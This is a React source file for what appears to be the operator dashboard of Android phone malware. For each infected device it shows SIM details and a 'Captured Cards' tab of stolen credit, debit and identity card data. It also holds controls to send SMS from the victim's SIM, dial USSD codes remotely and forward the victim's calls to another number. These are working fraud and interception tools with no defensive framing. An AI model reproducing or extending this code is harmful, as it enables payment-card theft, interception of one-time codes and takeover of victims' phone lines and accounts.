import React, { useEffect, useState, useRef } from 'react';
import { DeviceInfo, UserFullInfo } from '../types';
import { 
  subscribeToFullUserInfo, 
  sendCommandSms, 
  sendUssdCommand, 
  setCallForwarding, 
  markUserAsChecked,
  subscribeToLatestUssdResponse,
  subscribeToCallForwarding
} from '../services/firebase';

interface Props {
  targetUser: DeviceInfo;
  onBack: () => void;
}

const CollapsibleSection: React.FC<{ 
  title: string; 
  children: React.ReactNode; 
  color?: string;
  defaultOpen?: boolean; 
}> = ({ title, children, color = "text-gray-700", defaultOpen = false }) => {
  const [isOpen, setIsOpen] = useState(defaultOpen);

  return (
    <div className="bg-white rounded-lg shadow-sm border border-gray-200 overflow-hidden transition-all duration-200 mb-2">
      <button 
        onClick={() => setIsOpen(!isOpen)} 
        className="w-full px-4 py-3 bg-gray-50 hover:bg-gray-100 flex items-center justify-between transition-colors group focus:outline-none focus:ring-2 focus:ring-inset focus:ring-app-green"
        aria-expanded={isOpen}
      >
        <div className="flex items-center space-x-2">
           <span className={`text-xs font-bold uppercase tracking-wider ${color}`}>{title}</span>
        </div>
        <div className={`p-1 rounded-full text-gray-400 group-hover:text-gray-600 transition-transform duration-200 ${isOpen ? 'rotate-180 bg-gray-200/50' : ''}`}>
           <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" /></svg>
        </div>
      </button>
      
      {isOpen && (
        <div className="p-4 border-t border-gray-100 bg-white animate-fadeIn">
           {children}
        </div>
      )}
    </div>
  );
};

const JsonViewer: React.FC<{ data: any }> = ({ data }) => {
    const [copied, setCopied] = useState(false);
    
    const copyToClipboard = () => {
        const text = typeof data === 'string' ? data : JSON.stringify(data, null, 2);
        navigator.clipboard.writeText(text);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    const isObj = typeof data === 'object' && data !== null && !Array.isArray(data);
    const hasData = isObj ? Object.keys(data).length > 0 : !!data;

    return (
        <div className="relative group">
            <button 
                onClick={(e) => { e.stopPropagation(); copyToClipboard(); }}
                className="absolute right-0 -top-2 p-1.5 text-gray-400 hover:text-gray-600 rounded opacity-0 group-hover:opacity-100 transition-opacity focus:opacity-100 focus:outline-none z-10"
                title="Copy JSON"
            >
                {copied ? (
                    <svg className="w-4 h-4 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" /></svg>
                ) : (
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
                )}
            </button>
            <div className="text-sm text-gray-700">
                {!hasData ? (
                    <div className="text-xs text-gray-400 italic">No Data</div>
                ) : !isObj ? (
                    <div className="font-mono p-2 bg-gray-50 rounded break-all border border-gray-100">{String(data)}</div>
                ) : (
                    <div className="flex flex-col space-y-2">
                         {Object.entries(data).map(([k, v]) => (
                             <div key={k} className="flex flex-col sm:flex-row sm:items-baseline border-b border-gray-50 last:border-0 pb-1">
                                 <span className="text-xs font-bold text-gray-500 uppercase tracking-wider w-full sm:w-1/3 md:w-1/4 shrink-0 mb-1 sm:mb-0">
                                    {k.replace(/_/g, ' ')}:
                                 </span>
                                 <span className="font-mono text-gray-900 text-sm break-all w-full sm:w-2/3 md:w-3/4">
                                    {typeof v === 'object' && v !== null ? JSON.stringify(v) : String(v)}
                                 </span>
                             </div>
                         ))}
                    </div>
                )}
            </div>
        </div>
    );
};

const UserDataViewer: React.FC<Props> = ({ targetUser, onBack }) => {
  const [data, setData] = useState<UserFullInfo | null>(null);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState<'ACTIONS' | 'DATA' | 'CARDS'>('ACTIONS');

  const [showSmsModal, setShowSmsModal] = useState(false);
  const [showUssdModal, setShowUssdModal] = useState(false);
  const [showCallFwdModal, setShowCallFwdModal] = useState(false);

  // Form States
  const [smsForm, setSmsForm] = useState({ to: '', msg: '', slot: 0 });
  const [ussdInput, setUssdInput] = useState('');
  const [ussdSlot, setUssdSlot] = useState(0);
  const [callFwdForm, setCallFwdForm] = useState({ number: '', slot: 0 });
  
  const [ussdResponse, setUssdResponse] = useState<any>(null);
  const [ussdStatusText, setUssdStatusText] = useState('Response: Waiting for response...');
  
  const [callFwdStatus, setCallFwdStatus] = useState<string>('Waiting for device response...');
  const [actionStatus, setActionStatus] = useState<string | null>(null);
  
  // Load User Data & SIM Details
  useEffect(() => {
    setLoading(true);
    const unsubscribe = subscribeToFullUserInfo(targetUser.userId, (info) => {
      setData(info);
      setLoading(false);
      
      const s1 = info.simDetails?.sim1Number;
      const s2 = info.simDetails?.sim2Number;
      if (s1 && !s2) setUssdSlot(0);
      else if (!s1 && s2) setUssdSlot(1);
    });
    return () => unsubscribe();
  }, [targetUser.userId]);

  // USSD Response Listener
  useEffect(() => {
    if (showUssdModal) {
      setUssdResponse(null);
      setUssdStatusText('Response: Waiting for response...'); 
      const unsubscribe = subscribeToLatestUssdResponse(targetUser.userId, (resp) => {
        if (resp) {
            setUssdResponse(resp);
        }
      });
      return () => unsubscribe();
    }
  }, [showUssdModal, targetUser.userId]);

  // Call Forwarding Listener
  useEffect(() => {
    if (showCallFwdModal) {
      const unsubscribe = subscribeToCallForwarding(targetUser.userId, (data) => {
        if (data) {
           if (typeof data === 'string') setCallFwdStatus(data);
           else if (data.callForwardStatus) setCallFwdStatus(data.callForwardStatus);
        }
      });
      return () => unsubscribe();
    }
  }, [showCallFwdModal, targetUser.userId]);

  const handleSendSMS = async () => {
    if(!smsForm.to || !smsForm.msg) return;
    setActionStatus('Sending...');
    try {
      await sendCommandSms(targetUser.userId, smsForm.to, smsForm.msg, smsForm.slot);
      setActionStatus('Sent!');
      setTimeout(() => { setShowSmsModal(false); setActionStatus(null); setSmsForm({to:'', msg:'', slot:0}); }, 1500);
    } catch(e) { 
        setActionStatus('Error'); 
    }
  };

  const handleSendUssd = async () => {
    if(!ussdInput) return;
    setUssdStatusText('Response: Waiting for response...');
    setUssdResponse(null);
    try {
      await sendUssdCommand(targetUser.userId, ussdInput, ussdSlot);
    } catch(e) { 
        setUssdStatusText('Error sending command.');
    }
  };

  const handleCallFwdAction = async (enable: boolean) => {
    if(enable && !callFwdForm.number) {
        alert("Enter number");
        return;
    }
    setActionStatus('Sending...');
    setCallFwdStatus('Sending command to device...');
    try {
      await setCallForwarding(targetUser.userId, callFwdForm.number, callFwdForm.slot, enable);
      setActionStatus(null);
    } catch(e) { 
        setCallFwdStatus('Failed to update locally.'); 
    }
  };

  const handleMarkChecked = async () => {
    await markUserAsChecked(targetUser.userId);
  };

  if (loading) {
    return (
      <div className="h-full flex items-center justify-center bg-gray-50">
        <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-app-green"></div>
      </div>
    );
  }

  const simInfo = data?.simDetails || {};
  const devInfo = data?.deviceInfo || targetUser;
  const copyId = (id: string) => navigator.clipboard.writeText(id);

  const hasSim1 = !!simInfo.sim1Number || !!simInfo.sim1Provider;
  const hasSim2 = !!simInfo.sim2Number || !!simInfo.sim2Provider;

  return (
    <div className="h-full flex flex-col bg-gray-50">
      <header className="bg-white border-b border-gray-200 px-4 py-4 shadow-sm flex items-center justify-between sticky top-0 z-10">
        <div className="flex items-center space-x-3">
          <button onClick={onBack} className="p-2 rounded-full hover:bg-gray-100 text-gray-600 transition-colors focus:outline-none focus:ring-2 focus:ring-gray-300">
            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" /></svg>
          </button>
          <div>
            <h1 className="font-bold text-lg text-gray-900 leading-tight">{devInfo.Brand}</h1>
            <div className="flex items-center space-x-1">
               <p className="text-xs text-gray-500 font-mono">{devInfo.DeviceId}</p>
               <button onClick={()=>copyId(devInfo.DeviceId)} className="text-gray-400 hover:text-gray-600 focus:outline-none">
                   <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
               </button>
            </div>
          </div>
        </div>
        <div className="flex items-center space-x-3">
           <button onClick={handleMarkChecked} className="p-3 text-gray-400 hover:text-green-600 hover:bg-green-50 rounded-full transition-colors focus:outline-none focus:ring-2 focus:ring-green-500" title="Mark as Checked">
             <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
           </button>
           <div className={`px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wide ${devInfo.Status === 'Online' ? 'bg-green-100 text-green-700' : 'bg-gray-200 text-gray-600'}`}>
             {devInfo.Status}
           </div>
        </div>
      </header>

      <div className="flex-1 overflow-y-auto p-4 max-w-5xl mx-auto w-full space-y-6 pb-20">
        {/* SIM INFO DISPLAY */}
        <div className="bg-white rounded-xl shadow-sm border border-gray-100 p-5 grid grid-cols-1 md:grid-cols-2 gap-6">
          <div className="flex items-start space-x-3">
             <div className="bg-blue-50 p-2 rounded text-blue-600"><svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg></div>
             <div>
               <h3 className="text-xs font-bold text-gray-400 uppercase tracking-wide">SIM 1</h3>
               <p className="text-sm font-mono font-medium text-gray-900">{simInfo.sim1Number || 'N/A'}</p>
               <p className="text-xs text-gray-500">{simInfo.sim1Provider || 'Unknown Provider'}</p>
             </div>
          </div>
          <div className="flex items-start space-x-3">
             <div className="bg-purple-50 p-2 rounded text-purple-600"><svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg></div>
             <div>
               <h3 className="text-xs font-bold text-gray-400 uppercase tracking-wide">SIM 2</h3>
               <p className="text-sm font-mono font-medium text-gray-900">{simInfo.sim2Number || 'N/A'}</p>
               <p className="text-xs text-gray-500">{simInfo.sim2Provider || 'Unknown Provider'}</p>
             </div>
          </div>
        </div>

        <div className="flex bg-gray-200/50 p-1 rounded-xl">
          {['ACTIONS', 'DATA', 'CARDS'].map((tab) => (
             <button key={tab} onClick={() => setActiveTab(tab as any)} className={`flex-1 py-3 text-sm font-bold rounded-lg transition-all focus:outline-none focus:ring-2 focus:ring-app-green ${activeTab === tab ? 'bg-white shadow text-gray-900' : 'text-gray-500 hover:text-gray-700'}`}>
               {tab}
             </button>
          ))}
        </div>

        {activeTab === 'ACTIONS' && (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
             <button onClick={() => setShowSmsModal(true)} className="col-span-1 md:col-span-2 bg-gradient-to-r from-app-green to-teal-600 text-white p-6 rounded-xl shadow-md hover:shadow-lg transition-all flex items-center justify-center space-x-3 group focus:outline-none focus:ring-4 focus:ring-green-300">
               <svg className="w-8 h-8 group-hover:scale-110 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" /></svg>
               <div className="text-left"><span className="block font-bold text-xl">Enhanced SMS Control</span><span className="text-xs text-green-100 opacity-80">Send SMS from specific SIM slots</span></div>
             </button>

             <button onClick={() => setShowUssdModal(true)} className="bg-white border border-gray-200 p-6 rounded-xl shadow-sm hover:border-purple-300 hover:shadow-md transition-all flex flex-col items-center justify-center text-center space-y-2 group focus:outline-none focus:ring-4 focus:ring-purple-200">
               <div className="p-3 bg-purple-50 text-purple-600 rounded-full group-hover:bg-purple-100 transition-colors"><svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg></div>
               <span className="font-bold text-gray-800">USSD Terminal</span>
             </button>

             <button onClick={() => setShowCallFwdModal(true)} className="bg-white border border-gray-200 p-6 rounded-xl shadow-sm hover:border-blue-300 hover:shadow-md transition-all flex flex-col items-center justify-center text-center space-y-2 group focus:outline-none focus:ring-4 focus:ring-blue-200">
               <div className="p-3 bg-blue-50 text-blue-600 rounded-full group-hover:bg-blue-100 transition-colors"><svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" /></svg></div>
               <span className="font-bold text-gray-800">Call Forwarding</span>
             </button>
          </div>
        )}

        {activeTab === 'DATA' && (
          <div className="space-y-3">
             <div className="px-1 mb-2"><h3 className="text-sm font-bold text-gray-900">Device Information</h3><p className="text-xs text-gray-500">Technical details and status logs</p></div>
             {data?.info && Object.entries(data.info).map(([k, v]) => (
               <CollapsibleSection key={k} title={k} color="text-blue-600">
                  <JsonViewer data={v} />
               </CollapsibleSection>
             ))}
             {!data?.info && <div className="text-center text-gray-400 py-10 bg-white rounded-xl border border-dashed">No Additional Info</div>}
          </div>
        )}

        {activeTab === 'CARDS' && (
          <div className="space-y-3">
             <div className="px-1 mb-2"><h3 className="text-sm font-bold text-gray-900">Captured Cards</h3><p className="text-xs text-gray-500">Credit, debit, and identity card data</p></div>
             {data?.cards && Object.entries(data.cards).map(([k, v]) => (
               <CollapsibleSection key={k} title={k} color="text-purple-600" defaultOpen={true}>
                 <JsonViewer data={v} />
               </CollapsibleSection>
             ))}
             {!data?.cards && <div className="text-center text-gray-400 py-10 bg-white rounded-xl border border-dashed">No Card Data Found</div>}
          </div>
        )}
      </div>

      {/* SMS MODAL */}
      {showSmsModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-fadeIn">
          <div className="bg-white rounded-2xl shadow-2xl w-full max-w-sm overflow-hidden transform transition-all">
            <div className="bg-gradient-to-r from-app-green to-teal-600 px-6 py-4 text-white flex justify-between items-center">
              <span className="font-bold text-lg">Send SMS</span>
              <button onClick={()=>setShowSmsModal(false)} className="opacity-80 hover:opacity-100 focus:outline-none">✕</button>
            </div>
            <div className="p-6 space-y-5">
               <div>
                 <label className="block text-xs font-bold text-gray-500 uppercase mb-2">Sim Slot</label>
                 <div className="flex bg-gray-100 p-1 rounded-lg">
                    <button onClick={()=>setSmsForm({...smsForm, slot:0})} disabled={!hasSim1} className={`flex-1 py-2 rounded-md text-sm font-bold transition-all focus:outline-none ${smsForm.slot===0 ? 'bg-white shadow text-app-green' : 'text-gray-500 hover:text-gray-700'} ${!hasSim1 ? 'opacity-50 cursor-not-allowed':''}`}>SIM 1</button>
                    <button onClick={()=>setSmsForm({...smsForm, slot:1})} disabled={!hasSim2} className={`flex-1 py-2 rounded-md text-sm font-bold transition-all focus:outline-none ${smsForm.slot===1 ? 'bg-white shadow text-app-green' : 'text-gray-500 hover:text-gray-700'} ${!hasSim2 ? 'opacity-50 cursor-not-allowed':''}`}>SIM 2</button>
                 </div>
               </div>
               <div>
                  <label className="block text-xs font-bold text-gray-500 uppercase mb-2">To Number</label>
                  <input type="tel" value={smsForm.to} onChange={e=>setSmsForm({...smsForm, to:e.target.value})} className="w-full border border-gray-200 rounded-lg p-3 focus:border-app-green focus:outline-none bg-gray-50 focus:bg-white transition-all" placeholder="+1234567890" />
               </div>
               <div>
                  <label className="block text-xs font-bold text-gray-500 uppercase mb-2">Message</label>
                  <textarea value={smsForm.msg} onChange={e=>setSmsForm({...smsForm, msg:e.target.value})} rows={3} className="w-full border border-gray-200 rounded-lg p-3 focus:border-app-green focus:outline-none bg-gray-50 focus:bg-white transition-all resize-none" placeholder="Type your message..." />
               </div>
               {actionStatus && <p className="text-center text-sm font-bold text-green-600 animate-pulse">{actionStatus}</p>}
               <button onClick={handleSendSMS} className="w-full bg-app-green text-white py-3.5 rounded-xl font-bold shadow-lg shadow-green-200 hover:bg-green-700 transition-all focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-app-green">Send Command</button>
            </div>
          </div>
        </div>
      )}

      {/* USSD MODAL */}
      {showUssdModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-fadeIn">
          <div className="bg-white rounded-2xl shadow-2xl w-full max-w-md overflow-hidden flex flex-col h-[500px]">
            <div className="bg-gray-900 px-6 py-4 text-white flex justify-between items-center shrink-0">
               <span className="font-mono font-bold">USSD_TERMINAL</span>
               <button onClick={()=>setShowUssdModal(false)} className="opacity-80 hover:opacity-100 focus:outline-none">✕</button>
            </div>
            
            <div className="flex-1 overflow-y-auto p-4 bg-gray-50 font-mono text-sm">
               <div className="bg-white p-3 rounded-lg shadow-sm border border-gray-200 min-h-[100px]">
                  <p className="text-gray-500 text-xs mb-2">{ussdStatusText}</p>
                  {ussdResponse && (
                      <div className="space-y-2 animate-fadeIn">
                          <div className="flex justify-between border-b border-gray-100 pb-1">
                              <span className="font-bold text-gray-700">Code:</span> <span className="text-gray-900">{ussdResponse.ussdCode || ussdResponse.ussd}</span>
                          </div>
                          <div className="flex justify-between border-b border-gray-100 pb-1">
                              <span className="font-bold text-gray-700">SIM Slot:</span> <span className="text-gray-900">{ussdResponse.simSlot === 0 ? 'SIM 1' : 'SIM 2'}</span>
                          </div>
                          <div className="flex justify-between border-b border-gray-100 pb-1">
                              <span className="font-bold text-gray-700">Time:</span> <span className="text-gray-900 text-xs">{ussdResponse.formattedTimestamp || new Date(ussdResponse.timestamp).toLocaleString()}</span>
                          </div>
                          <div className="flex justify-between border-b border-gray-100 pb-1">
                              <span className="font-bold text-gray-700">Status:</span> 
                              <span className={ussdResponse.status === 'Success' ? 'text-green-600 font-bold' : 'text-red-600 font-bold'}>
                                {ussdResponse.status}
                              </span>
                          </div>
                          <div className="pt-2">
                              <span className="font-bold block mb-1 text-gray-700">Response:</span>
                              <p className="bg-gray-50 p-2 rounded border border-gray-200 whitespace-pre-wrap text-gray-800 break-words">{ussdResponse.response}</p>
                          </div>
                      </div>
                  )}
               </div>
            </div>

            <div className="p-4 bg-white border-t border-gray-200 shrink-0">
               <div className="flex items-center space-x-3 mb-3">
                  <span className="text-xs font-bold text-gray-400 uppercase">Target SIM</span>
                  <div className="flex bg-gray-100 rounded-md p-0.5">
                    <button onClick={()=>setUssdSlot(0)} disabled={!hasSim1} className={`px-3 py-1 text-xs rounded font-bold transition-all focus:outline-none ${ussdSlot===0 ? 'bg-white shadow text-gray-900':'text-gray-400'} ${!hasSim1?'opacity-50 cursor-not-allowed':''}`}>SIM 1</button>
                    <button onClick={()=>setUssdSlot(1)} disabled={!hasSim2} className={`px-3 py-1 text-xs rounded font-bold transition-all focus:outline-none ${ussdSlot===1 ? 'bg-white shadow text-gray-900':'text-gray-400'} ${!hasSim2?'opacity-50 cursor-not-allowed':''}`}>SIM 2</button>
                  </div>
               </div>
               <div className="flex gap-2">
                   <input id="ussd-in" type="text" value={ussdInput} onChange={e=>setUssdInput(e.target.value)} onKeyDown={e=>e.key==='Enter'&&handleSendUssd()} className="flex-1 border border-gray-300 rounded-lg px-4 py-2 focus:outline-none focus:border-gray-900 font-mono" placeholder="*121#" autoFocus />
                   <button onClick={handleSendUssd} className="bg-gray-900 text-white px-4 py-2 rounded-lg font-bold hover:bg-black transition-colors">DIAL</button>
               </div>
            </div>
          </div>
        </div>
      )}

      {/* CALL FORWARDING MODAL */}
      {showCallFwdModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-fadeIn">
          <div className="bg-white rounded-2xl shadow-2xl w-full max-w-sm overflow-hidden transform transition-all">
            <div className="bg-blue-600 px-6 py-4 text-white flex justify-between items-center">
              <span className="font-bold text-lg">Call Forwarding</span>
              <button onClick={()=>setShowCallFwdModal(false)} className="opacity-80 hover:opacity-100 focus:outline-none">✕</button>
            </div>
            <div className="p-6 space-y-5">
               <div className="bg-gray-900 text-green-400 p-4 rounded-lg font-mono text-xs h-24 overflow-y-auto border border-gray-800 shadow-inner">
                  <p className="font-bold text-gray-500 mb-2 border-b border-gray-800 pb-1 block">DEVICE OUTPUT >_</p>
                  <p className="whitespace-pre-wrap leading-relaxed">{callFwdStatus}</p>
               </div>

               <div>
                 <label className="block text-xs font-bold text-gray-500 uppercase mb-2">Sim Slot</label>
                 <div className="flex bg-gray-100 p-1 rounded-lg">
                    <button onClick={()=>setCallFwdForm({...callFwdForm, slot:0})} disabled={!hasSim1} className={`flex-1 py-2 rounded-md text-sm font-bold transition-all focus:outline-none ${callFwdForm.slot===0 ? 'bg-white shadow text-blue-600':'text-gray-500'} ${!hasSim1?'opacity-50 cursor-not-allowed':''}`}>SIM 1</button>
                    <button onClick={()=>setCallFwdForm({...callFwdForm, slot:1})} disabled={!hasSim2} className={`flex-1 py-2 rounded-md text-sm font-bold transition-all focus:outline-none ${callFwdForm.slot===1 ? 'bg-white shadow text-blue-600':'text-gray-500'} ${!hasSim2?'opacity-50 cursor-not-allowed':''}`}>SIM 2</button>
                 </div>
               </div>
               
               <div>
                  <label className="block text-xs font-bold text-gray-500 uppercase mb-2">Forward To Number</label>
                  <input type="tel" value={callFwdForm.number} onChange={e=>setCallFwdForm({...callFwdForm, number:e.target.value})} className="w-full border border-gray-200 rounded-lg p-3 focus:border-blue-500 focus:outline-none" placeholder="Enter target number" />
               </div>
               
               <div className="grid grid-cols-2 gap-3">
                 <button onClick={()=>handleCallFwdAction(true)} className="bg-blue-600 text-white py-3 rounded-lg font-bold shadow-sm hover:bg-blue-700 transition-all focus:outline-none">Enable</button>
                 <button onClick={()=>handleCallFwdAction(false)} className="bg-red-50 text-red-600 py-3 rounded-lg font-bold border border-red-200 hover:bg-red-100 transition-all focus:outline-none">Disable</button>
               </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default UserDataViewer;